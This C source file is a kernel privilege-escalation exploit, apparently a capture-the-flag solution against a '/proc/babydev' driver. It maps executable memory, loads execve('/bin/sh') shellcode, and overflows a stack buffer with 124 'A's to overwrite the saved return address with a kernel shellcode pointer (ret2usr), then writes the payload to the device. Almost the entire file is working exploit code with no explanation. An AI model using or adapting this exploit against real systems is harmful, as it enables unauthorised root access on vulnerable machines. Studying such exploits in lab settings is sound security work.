#define MAP_PRIVATE     0x02    /* Changes are private.  */
#define MAP_FIXED       0x10    /* Interpret addr exactly.  */
#define MAP_ANONYMOUS   0x20    /* Don't use a file.  */
#define O_RDWR          0x0002  /* open for reading and writing */

typedef unsigned long long qword;

extern void kernel_shellcode();
char user_shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

qword mcpy(char * dst, char * src, qword n)
{
    for (qword i = 0; i < n; ++i)
        dst[i] = src[i];
    return n;
}

void * mmap(void * addr, qword size, qword prot, qword flags)
{
    return syscall64(9, addr, size, prot, flags, -1, 0);
}

int _start (int argc, char **argv) 
{
    char buf[0x1000];
    char * payload = buf;
    // Prepare memory for ret2usr
    void *userland_stack = mmap((void *)0xcafe000, 0x1000, 7, MAP_ANONYMOUS|MAP_PRIVATE|0x0100);
    void *userland_code = mmap((void *)0x1234000, 0x1000, 7, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE);
    mcpy(userland_code, &user_shellcode,sizeof(user_shellcode));
    // Fill up stack until saved_rip
    for (int i = 0;  i < 124; i++)
        *(payload++) = 'A';
    *(qword *)payload = (qword) kernel_shellcode; payload += 8;
    // Profit
    int vuln_fd = syscall64(2, "/proc/babydev", O_RDWR,100,0, 0,0);
    syscall64(1, vuln_fd, buf, payload - buf, -1,-1,-1);
    syscall64(0x60, 0, -1,-1,-1,-1,-1);
    return 0;
}